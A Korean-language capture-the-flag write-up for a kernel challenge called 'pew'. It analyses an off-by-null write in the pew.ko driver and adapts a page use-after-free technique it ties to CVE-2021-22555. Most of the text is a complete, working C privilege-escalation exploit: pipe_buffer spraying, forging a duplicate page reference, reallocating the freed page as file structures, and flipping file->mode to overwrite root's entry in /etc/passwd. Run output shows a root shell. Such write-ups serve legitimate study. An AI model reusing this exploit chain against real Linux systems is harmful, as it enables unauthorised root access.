# pew

키워드: Off-by-Null, UAF, pipe

전형적인 커널 익스 문제이며 CVE 취약점을 활용하는 문제입니다.

대상 CVE는 CVE-2021-22555입니다. Page UAF 취약점으로 KASLR 우회가 필요 없는 미친 공격기법이라고 하네요. WoW

# 🚩 **pew 문제 풀이**

본 문제는 pew.ko 모듈에서 발생하는 **Off-by-one (Off-by-Null)** 취약점을 이용해 커널 권한 상승을 수행하는 CTF 문제입니다.

## 📌 **Step 1: 드라이버 분석**

문제에서 제공된 커널 모듈 `pew.ko`을 분석한 결과, 주요 동작은 다음과 같습니다.

- `/dev/pew` 장치를 생성하고, 장치 오픈 시 0x1000 크기의 커널 버퍼(`buffer`)를 `kmalloc`으로 할당합니다.
    
    ```c
    __int64 pew_open()
    {
      unsigned int v0; // ebx
    
      v0 = 0;
      if ( !buffer )
      {
        buffer = _kmalloc(MAX_BUF, 0x400DC0LL);     // GFP_KERNEL | __GFP_ZERO
    ```
    
    - MAX_BUF == 0x1000
- `pew_ioctl` 함수를 통해 사용자 입력값(`val`, `off`)을 설정하고, `ioctl`을 이용해 **한 번**만 버퍼에 기록할 수 있습니다.

이때 문제가 되는 코드는 다음과 같습니다.

```c
if (allowed && off <= MAX_BUF && buffer) {
    buffer[off] = val;
    allowed = 0;
}
```

버퍼의 크기는 0x1000인데, off의 조건이 `off <= MAX_BUF`이기 때문에 `off = MAX_BUF`일 때 버퍼 범위를 1바이트 벗어난 곳에 데이터를 쓸 수 있는 **Off-by-one**(Off-by-Null) 취약점이 존재합니다.

---

## 📌 **Step 2: 공격 전략 (Attack Strategy)**

본 문제는 CVE-2021-22555에서 사용된 기법과 동일하게, **pipe_buffer** 구조체를 오염시키는 전략을 사용했습니다.

`pipe_buffer` 구조체의 구성:

```c
struct pipe_buffer {
    struct page *page;
    unsigned int offset, len;
    const struct pipe_buf_operations *ops;
    unsigned int flags;
    unsigned long private;
};
```

이 구조체의 첫 필드(`page`)를 Off-by-Null로 덮어쓰면, 서로 다른 두 개의 pipe가 동일한 페이지를 참조하도록 할 수 있습니다. 즉, 한쪽 파이프가 해제되어도 나머지 한쪽에서 페이지를 계속 사용할 수 있는 **Use-After-Free(UAF)** 상황을 만들 수 있습니다.

- ex) 두 개의 객체가 있다고 가정합시다. 첫 번째 객체는 `page`가 0xffffea0000241180이고, 두 번째는 0xffffea00002411c0입니다. 첫 번째 객체에 0xc0 바이트를 쓰면 두 객체는 같은 페이지를 참조하게 됩니다. 이 중 하나가 해제되면 페이지도 해제되지만, 다른 객체를 통해 “use-after-free”가 가능해집니다.

---

## 📌 **Step 3: 공격 시나리오**

공격의 주요 흐름은 다음과 같습니다.

1. **파이프 스프레이(pipe spray)**
    - 다수의 파이프(128개)를 생성하고, 내부 버퍼 크기를 크게 확장하여 pipe_buffer 구조체를 힙 영역에 많이 할당합니다.
        
        ```c
        // 1. 파이프 생성
        for (int i = 0; i < PIPE_NUM; i++) {
            if (pipe(pipe_fd[i]) < 0)
                errExit("pipe() failed");
        }
        
        // 2. 각 파이프의 내부 버퍼 크기를 확장 (0x1000 * 64 = 256KB)
        for (int i = 0; i < PIPE_NUM; i++) {
            if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0)
                errExit("F_SETPIPE_SZ failed");
        }
        ```
        
2. **식별 데이터 삽입**
    - 각 파이프에 고유한 magic 값(`0xdeadbeef + i`)과 식별 문자열(`"KEYME!!!"`)을 기록하여 나중에 오염된 파이프를 탐색하기 쉽게 합니다.
        
        ```c
        // 3. 파이프에 식별 데이터 삽입:
        //    - 식별 문자열 ("KEYME!!!")와 고유 magic 값 (0xdeadbeef + i)
        
        for (int i = 0; i < PIPE_NUM; i++) {
            // 0x10의 배수 인덱스는 의도적으로 비워둬 나중에 hole로 사용합니다.
            if (i % 0x10 != 0) {
                memcpy(tmp, "KEYME!!!", 0x8);
                pipe_magic = 0xdeadbeef + i;
                write(pipe_fd[i][1], tmp, 0x8);
                write(pipe_fd[i][1], &pipe_magic, 0x8);
            }
        }
        ```
        
3. **Hole 생성**
    - 일부 파이프를 닫아 힙 슬랩에 hole(빈 공간)을 만듭니다.
        
        ```c
        // 4. 일정 간격(0x10 단위)으로 파이프를 닫아 hole 생성
        printf("[*] Creating holes in pipes...\n");
        for (int i = 0x10; i < PIPE_NUM; i += 0x10) {
            close(pipe_fd[i][0]);
            close(pipe_fd[i][1]);
        }
        ```
        
4. **Off-by-Null 취약점 트리거**
    - `/dev/pew`의 ioctl을 호출하여 버퍼 끝을 넘어 pipe_buffer의 첫 필드(`page`)를 `0x00`으로 덮어씁니다.
        
        ```c
        // 5. /dev/pew를 이용하여 Off-by-Null 취약점 트리거
        /* 
        * /dev/pew를 이용하여 Off-by-Null 취약점을 트리거
        * 내부 버퍼의 끝(인덱스 MAX_BUF)에 0x00을 씀
        */
        printf("[*] Triggering Off-by-Null via /dev/pew...\n");
        fd = open("/dev/pew", O_RDONLY);
        setVal(fd, 0x00);  // 0x00이든 0xc0든 상관없음. 0x?0 형태면 왠만하면 상관없을듯?
        setOff(fd, 0x1000);
        setChar(fd);
        ```
        
5. **중복된 pipe_buffer 찾기**
    - 각 파이프에서 데이터를 읽어보고, 원본 magic 값과 다른 값을 가지는 파이프를 찾아 중복 파이프(`victim`, `prev`)를 식별합니다.
        
        ```c
        // 6. 오염된(덮어쓴) 파이프를 탐색하여 중복 파이프(dup pipe)를 찾는다.
        size_t victim_idx = 0, prev_idx = 0, magic = 0;
        void *tmp_content = malloc(0x1000);
        for (int i = 0; i < PIPE_NUM; i++) {
            // hole이 아닌 파이프만 확인
            if (i % 0x10) {
                read(pipe_fd[i][0], tmp_content, 8);
                read(pipe_fd[i][0], &magic, 8);
                // 식별 문자열은 동일해야 하며, magic 값이 원래와 달라졌다면 오염된 것으로 판단
                if (magic != (0xdeadbeef + i) && (memcmp(tmp_content, "KEYME!!!", 8) == 0)) {
                    victim_idx = magic - 0xdeadbeef;
                    prev_idx = i;
                    if (victim_idx >= PIPE_NUM)
                        errExit("Could not find corrupted (dup) pipe.");
                    printf("[*] Found dup pipes: victim=%lu, prev=%lu\n", victim_idx, prev_idx);
                    break;
                }
            }
        }
        if (victim_idx == 0 || prev_idx == 0)
            errExit("Could not find corrupted (dup) pipe.");
        ```
        
6. **UAF 상태 만들기**
    - 두 파이프 중 하나(`victim`)를 닫아, 참조하던 페이지를 free하여 UAF를 발생시킵니다.
        
        ```c
        // 7. prev_idx 파이프에 데이터를 써서, 오염된 영역(예: file 구조체의 mode 필드)을 조작
        write(pipe_fd[prev_idx][1], tmp_content, 0x14); // file->mode의 오프셋이 0x14이므로 0x14 바이트만큼 먼저 써서 다음번 쓰기에 file->mode에 쓸 수 있도록 함
        
        // 8. victim 파이프를 닫아 UAF 상태 유도
        printf("[*] Freeing victim pipe's page for UAF...\n");
        close(pipe_fd[victim_idx][0]);
        close(pipe_fd[victim_idx][1]);
        sleep(1);
        ```
        
7. **파일 구조체 재할당 (File Spray)**
    - `/etc/passwd` 파일을 여러 번 열어 UAF된 페이지에 file 구조체를 재할당시킵니다.
        
        ```c
        // 9. /etc/passwd 파일을 여러 번 열어, 해제된 페이지에 file 구조체가 재할당되도록 파일 스프레이
        printf("[*] Spraying /etc/passwd files...\n");
        for (int i = 0; i < FILE_NUM; i++) {
            file_fd[i] = open("/etc/passwd", 0);
            if (file_fd[i] < 0)
                errExit("Opening /etc/passwd failed");
        }
        ```
        
8. **파일 구조체 변조 및 `/etc/passwd` 덮어쓰기**
    - 남은 파이프(`prev`)를 통해 file 구조체의 `mode` 필드를 덮어 쓰기 가능 상태로 바꾼 후, 루트의 비밀번호를 변경한 내용을 `/etc/passwd`에 덮어씁니다.
        
        ```c
        // 10. prev_idx 파이프를 이용하여 passwd 파일 페이지를 덮어쓰도록 준비
        int mode = 0x480e801f; // 기본적으로 /etc/passwd 파일은 쓰기 권한 없이 열리므로 file->mode를 조작하여 쓰기 권한이 있도록 속임
        write(pipe_fd[prev_idx][1], &mode, 4);
        
        // 11. /etc/passwd를 덮어써서 root 계정의 비밀번호를 변경 (새 비밀번호: "root")
        char *data = "root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root root
        printf("[*] Overwriting /etc/passwd root entry...\n");
        int data_size = strlen(data);
        for (int i = 0; i < FILE_NUM; i++) {
            int retval = write(file_fd[i], data, data_size);
            if (retval > 0) {
                printf("[+] /etc/passwd overwrite success: FD %d\n", i);
                system("id; cat /etc/passwd; sh"); // 반드시 sh 실행해야함. sh 실행안하면 kernel panic 뜨고 qemu 종료됨
            }
            //printf("%d\n", i);
        }
        ```
        

---

## 📌 **Step 4: 최종 Exploit 코드**

```c
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define PIPE_NUM 0x80         // 128개의 파이프 생성
#define FILE_NUM 0x300        // /etc/passwd 스프레이용 FD 수

#define PEW_IOCTL_SET_OFFSET   0x1001
#define PEW_IOCTL_SET_VALUE    0x1002
#define PEW_IOCTL_WRITE_VALUE  0x1003

/* 에러 처리 함수 */
void errExit(char *msg) {
    fprintf(stderr, "[x] Error: %s\n", msg);
    exit(EXIT_FAILURE);
}

static inline int setVal(int fd, char val) { return ioctl(fd, PEW_IOCTL_SET_VALUE, val); }
static inline int setOff(int fd, size_t off) {
  return ioctl(fd, PEW_IOCTL_SET_OFFSET, off);
}
static inline int setChar(int fd) { return ioctl(fd, PEW_IOCTL_WRITE_VALUE); }

int pipe_fd[PIPE_NUM][2];
int file_fd[FILE_NUM];

int main() {
    int fd;
    char *tmp = malloc(0x1000);
    size_t pipe_magic;

    printf("[+] Customized pew.ko exploit (Off-by-Null / Dup-Pipe attack / CVE-2021-22555)\n");

    // 1. 파이프 생성
    for (int i = 0; i < PIPE_NUM; i++) {
        if (pipe(pipe_fd[i]) < 0)
            errExit("pipe() failed");
    }

    // 2. 각 파이프의 내부 버퍼 크기를 확장 (0x1000 * 64 = 256KB)
    for (int i = 0; i < PIPE_NUM; i++) {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 64) < 0)
            errExit("F_SETPIPE_SZ failed");
    }

    // 3. 파이프에 식별 데이터 삽입:
    //    - 식별 문자열 ("KEYME!!!")와 고유 magic 값 (0xdeadbeef + i)
    
    for (int i = 0; i < PIPE_NUM; i++) {
        // 0x10의 배수 인덱스는 의도적으로 비워둬 나중에 hole로 사용합니다.
        if (i % 0x10 != 0) {
            memcpy(tmp, "KEYME!!!", 0x8);
            pipe_magic = 0xdeadbeef + i;
            write(pipe_fd[i][1], tmp, 0x8);
            write(pipe_fd[i][1], &pipe_magic, 0x8);
        }
    }

    // 4. 일정 간격(0x10 단위)으로 파이프를 닫아 hole 생성
    printf("[*] Creating holes in pipes...\n");
    for (int i = 0x10; i < PIPE_NUM; i += 0x10) {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }

    // 5. /dev/pew를 이용하여 Off-by-Null 취약점 트리거
    /* 
    * /dev/pew를 이용하여 Off-by-Null 취약점을 트리거
    * 내부 버퍼의 끝(인덱스 MAX_BUF)에 0x00을 씀
    */
    printf("[*] Triggering Off-by-Null via /dev/pew...\n");
    fd = open("/dev/pew", O_RDONLY);
    setVal(fd, 0x00);  // 0x00이든 0xc0든 상관없음. 0x?0 형태면 왠만하면 상관없을듯?
    setOff(fd, 0x1000);
    setChar(fd);

    // 6. 오염된(덮어쓴) 파이프를 탐색하여 중복 파이프(dup pipe)를 찾는다.
    size_t victim_idx = 0, prev_idx = 0, magic = 0;
    void *tmp_content = malloc(0x1000);
    for (int i = 0; i < PIPE_NUM; i++) {
        // hole이 아닌 파이프만 확인
        if (i % 0x10) {
            read(pipe_fd[i][0], tmp_content, 8);
            read(pipe_fd[i][0], &magic, 8);
            // 식별 문자열은 동일해야 하며, magic 값이 원래와 달라졌다면 오염된 것으로 판단
            if (magic != (0xdeadbeef + i) && (memcmp(tmp_content, "KEYME!!!", 8) == 0)) {
                victim_idx = magic - 0xdeadbeef;
                prev_idx = i;
                if (victim_idx >= PIPE_NUM)
                    errExit("Could not find corrupted (dup) pipe.");
                printf("[*] Found dup pipes: victim=%lu, prev=%lu\n", victim_idx, prev_idx);
                break;
            }
        }
    }
    if (victim_idx == 0 || prev_idx == 0)
        errExit("Could not find corrupted (dup) pipe.");

    // 7. prev_idx 파이프에 데이터를 써서, 오염된 영역(예: file 구조체의 mode 필드)을 조작
    write(pipe_fd[prev_idx][1], tmp_content, 0x14); // file->mode의 오프셋이 0x14이므로 0x14 바이트만큼 먼저 써서 다음번 쓰기에 file->mode에 쓸 수 있도록 함

    // 8. victim 파이프를 닫아 UAF 상태 유도
    printf("[*] Freeing victim pipe's page for UAF...\n");
    close(pipe_fd[victim_idx][0]);
    close(pipe_fd[victim_idx][1]);
    sleep(1);

    // 9. /etc/passwd 파일을 여러 번 열어, 해제된 페이지에 file 구조체가 재할당되도록 파일 스프레이
    printf("[*] Spraying /etc/passwd files...\n");
    for (int i = 0; i < FILE_NUM; i++) {
        file_fd[i] = open("/etc/passwd", 0);
        if (file_fd[i] < 0)
            errExit("Opening /etc/passwd failed");
    }

    // 10. prev_idx 파이프를 이용하여 passwd 파일 페이지를 덮어쓰도록 준비
    int mode = 0x480e801f; // 기본적으로 /etc/passwd 파일은 쓰기 권한 없이 열리므로 file->mode를 조작하여 쓰기 권한이 있도록 속임
    write(pipe_fd[prev_idx][1], &mode, 4);

    // 11. /etc/passwd를 덮어써서 root 계정의 비밀번호를 변경 (새 비밀번호: "root")
    char *data = "root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt root root
    printf("[*] Overwriting /etc/passwd root entry...\n");
    int data_size = strlen(data);
    for (int i = 0; i < FILE_NUM; i++) {
        int retval = write(file_fd[i], data, data_size);
        if (retval > 0) {
            printf("[+] /etc/passwd overwrite success: FD %d\n", i);
            system("id; cat /etc/passwd; sh"); // 반드시 sh 실행해야함. sh 실행안하면 kernel panic 뜨고 qemu 종료됨
        }
        //printf("%d\n", i);
    }

    printf("[!] Exploit Fail!\n");
    
    return 0;
}

```

이 공격을 통해, `/etc/passwd`에 새로운 루트 비밀번호(`root`)를 설정하고, root/root로 로그인하면 root 쉘을 획득할 수 있습니다.

```python
[+] Customized pew.ko exploit (Off-by-Null / Dup-Pipe attack / CVE-2021-22555)
[*] Creating holes in pipes...
[*] Triggering Off-by-Null via /dev/pew...
[*] Found dup pipes: victim=122, prev=123
[*] Freeing victim pipe's page for UAF...
[*] Spraying /etc/passwd files...
[*] Overwriting /etc/passwd root entry...
[+] /etc/passwd overwrite success: FD 32
id: /etc/passwd: bad record
uid=1000 gid=1000(ctf) groups=1000(ctf)
root:$1$root$9gr5KxwuEdiI80GtIzd.U0:0:0:test:/root:/bin/sh
:/bin/sh
sh: can't access tty; job control turned off
sh: /etc/passwd: bad record
/home/ctf $ su
Password: 
sh: can't access tty; job control turned off
/home/ctf # id
uid=0(root) gid=0(root) groups=0(root)
/home/ctf # cat /flag
codegate2025{!nT3nD3d_s0Lut!0N_W@s_P4gE_u@F_Y0UrS_T0o?}
```

---

## 📌 **Step 5: 주의점**

- pipe_buffer의 page를 조작하고 중복된 pipe_buffer를 찾는 과정에서 운 요소가 존재하기 때문에 익스는 항상 성공하지 않습니다.
- 따라서 init 스크립트를 조작하여 ./exploit을 실행하는 과정을 자동화하고 익스가 성공할 때까지 여러 번 시도하는 방식으로 진행했습니다.

---

## 📌 **Reference**

[Page-UAF/CVE-2021-22555 at master · Lotuhu/Page-UAF](https://github.com/Lotuhu/Page-UAF/tree/master/CVE-2021-22555)
